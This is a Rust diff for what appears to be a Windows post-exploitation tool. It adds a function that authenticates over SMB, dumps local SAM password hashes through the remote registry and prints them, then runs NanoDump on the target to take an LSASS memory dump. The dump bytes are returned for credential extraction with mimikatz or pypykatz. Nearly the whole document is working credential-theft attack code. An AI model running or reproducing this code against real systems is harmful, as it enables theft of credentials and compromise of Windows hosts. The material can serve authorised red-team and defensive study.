@@ -25,6 +25,7 @@ use netraze_dcerpc::interfaces::{scmr, winreg};
 use super::connection::SmbCredential;
 use super::hive::Hive;
 use super::lsa::{self, LsaDumpResult};
+use super::nanodump;
 use super::rpc::{bind_svcctl_over_smb, bind_winreg_over_smb, connect_session};
 use super::sam::{self, SamHash};
 use super::smb2::Smb2Session;
@@ -764,4 +765,72 @@ pub async fn secrets_dump(
     handle.finish(&session, ipc, &cred).await;
 
     Ok(())
+}
+
+// ---------------------------------------------------------------------------
+// secrets_dump_nanodump — SAM via registry + LSASS via NanoDump
+// ---------------------------------------------------------------------------
+
+/// Full dump: SAM hashes via registry (same as `secrets_dump`) + LSASS
+/// minidump via NanoDump.
+///
+/// Returns the raw `.dmp` bytes so the caller can save them and feed them to
+/// pypykatz / mimikatz for credential extraction.
+///
+/// * `nanodump_bytes` — content of `nanodump.x64.exe` read from the local
+///   filesystem.
+/// * `technique`      — NanoDump flag WITHOUT the leading `--`, e.g. `"fork"`,
+///   `"dup"`, `"snapshot"`.
+/// * `live_log`       — progress sink (UI streaming / println).
+pub async fn secrets_dump_nanodump(
+    target: &str,
+    username: &str,
+    password: &str,
+    domain: Option<&str>,
+    nanodump_bytes: &[u8],
+    technique: &str,
+    live_log: &(dyn Fn(&str) + Send + Sync),
+) -> Result<Vec<u8>, String> {
+    let cred = SmbCredential::new(username, domain.unwrap_or(""), password);
+
+    // ── 1. SAM hashes via registry ────────────────────────────────────────
+    let session = Arc::new(Mutex::new(
+        connect_session(target, &cred).map_err(|e| format!("connect_session: {e}"))?,
+    ));
+    let ipc = session
+        .lock()
+        .map_err(|e| format!("session mutex poisoned: {e}"))?
+        .tree_connect(target, "IPC$")
+        .map_err(|e| format!("tree_connect IPC$: {e}"))?;
+
+    let handle = RemoteRegistryHandle::start(&session, ipc, &cred).await?;
+
+    let sam_result = dump_sam(&session, ipc, target, &cred)
+        .await
+        .map_err(|e| format!("SAM dump: {e}"))?;
+
+    handle.finish(&session, ipc, &cred).await;
+
+    // Print SAM results (same format as secrets_dump)
+    println!(
+        "[*] Target system bootKey: 0x{}",
+        sam_result
+            .bootkey
+            .iter()
+            .map(|b| format!("{b:02x}"))
+            .collect::<String>()
+    );
+    println!("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
+    for h in &sam_result.hashes {
+        println!("{h}");
+    }
+
+    // ── 2. LSASS minidump via NanoDump ────────────────────────────────────
+    println!("[*] Dumping LSASS via NanoDump (--{technique})");
+    let technique_flag = format!("--{technique}");
+    let dump = nanodump::remote_lsass_dump(target, &cred, nanodump_bytes, &technique_flag, live_log)
+        .await?;
+
+    println!("[+] {}", dump.summary);
+    Ok(dump.dump_bytes)
 }
